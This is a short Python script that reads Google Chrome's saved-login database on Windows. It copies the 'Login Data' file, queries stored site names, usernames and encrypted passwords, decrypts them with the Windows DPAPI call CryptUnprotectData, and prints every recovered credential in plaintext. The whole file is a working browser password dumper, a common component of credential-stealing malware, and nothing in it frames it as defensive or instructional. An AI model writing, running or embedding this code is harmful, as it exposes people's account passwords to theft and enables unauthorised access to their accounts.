import os
import sys
import sqlite3
import shutil
import win32crypt
db_file_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')
tmp_file = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\LoginDataCopy')
if os.path.exists(tmp_file):
    os.remove(tmp_file)

# In case file locked
shutil.copyfile(db_file_path, tmp_file) 

connect = sqlite3.connect(tmp_file)

for row in connect.execute('select signon_realm, username_value, password_value from logins'):
    try:
        password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
    except:
        sys.exit(-1)
    if row[1] and row[2]: # Print if Username and Password found
        print('{0:<40}{1:<30}{2}\n'.format(row[0], row[1], password.decode()))

# Close connection and remove temp file
connect.close()
os.remove(tmp_file)